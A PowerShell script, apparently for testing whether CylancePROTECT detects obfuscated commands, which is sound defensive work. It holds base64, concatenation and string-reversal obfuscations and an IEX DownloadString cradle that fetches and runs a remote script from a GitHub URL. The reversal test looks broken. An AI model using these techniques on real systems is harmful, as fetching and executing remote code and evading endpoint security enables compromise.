# PowerShell Obfuscation Test Script for CylancePROTECT
# Author: imrankhairuddin
# NOTE: Run in controlled test environment only!

function Test-Section {
    param($description, $command)
    Write-Host "`n--- $description ---" -ForegroundColor Cyan
    Write-Host "Command: $command" -ForegroundColor Yellow
    Start-Sleep -Seconds 3
    try {
        Invoke-Expression $command
    } catch {
        Write-Warning "Execution failed: $_"
    }
    Start-Sleep -Seconds 5
}

Test-Section "Plain Start-Process notepad" 'Start-Process notepad'

$encoded = "UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAG4AbwB0AGUAcABhAGQA"
Test-Section "Base64-encoded command" "powershell.exe -EncodedCommand $encoded"

Test-Section "Concatenated command" '(&("Sta" + "rt-Pro" + "cess") "notepad")'

Test-Section "String reversal (iex notepad)" '$s = "dape ton"; $s = -join ($s.ToCharArray() | [Array]::Reverse($s)); iex $s'


$testUrl = "https://raw.githubusercontent.com/merankhairuddin/PersonalHostScript/refs/heads/main/testpayload.ps1"
Test-Section "Simulated download execution" "IEX (New-Object Net.WebClient).DownloadString('$testUrl')"

Write-Host "`n All tests completed. Check CylancePROTECT console/logs for responses." -ForegroundColor Green
